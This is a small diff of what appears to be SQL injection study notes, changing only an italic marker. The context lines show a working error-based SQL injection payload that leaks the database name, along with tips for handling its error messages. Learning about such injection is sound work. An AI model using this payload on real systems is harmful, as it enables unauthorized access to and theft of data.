@@ -40,5 +40,5 @@ We can play aroun with other commands as below:
 `' or (select 1 from (Select count(*),concat((select database()),"+",floor(rand()*2))a from information_schema.tables group by a)b)#` 
 
 _'Operand should contain 1 column(s)' = prepend `(select 1`  
-'Subquery returns more than 1 row' = keep running the query until error!
+'Subquery returns more than 1 row' = keep running the query until error!_
 
